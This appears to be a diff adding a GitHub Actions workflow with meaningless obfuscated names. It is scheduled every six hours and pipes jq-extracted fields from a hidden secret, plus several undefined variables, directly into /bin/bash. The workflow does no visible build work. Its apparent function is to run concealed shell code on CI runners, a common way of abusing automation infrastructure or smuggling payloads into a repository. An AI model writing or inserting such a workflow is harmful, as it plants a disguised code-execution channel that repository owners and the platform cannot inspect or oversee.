@@ -1,0 +1,23 @@
+name: davidbranchww
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: davidbranchww
+        env:
+          kxm96126: ${{ secrets.kxm96126 }}
+        run: |
+          echo $kxm96126 | jq -r .h72 | /bin/bash
+          echo $m3637 | jq -r .dej26 | /bin/bash
+          echo $oz7257 | jq -r .wzfkr19285 | /bin/bash
+          echo $lswo362 | jq -r .z2 | /bin/bash
+          echo $ll638 | jq -r .bqsn58696 | /bin/bash
+
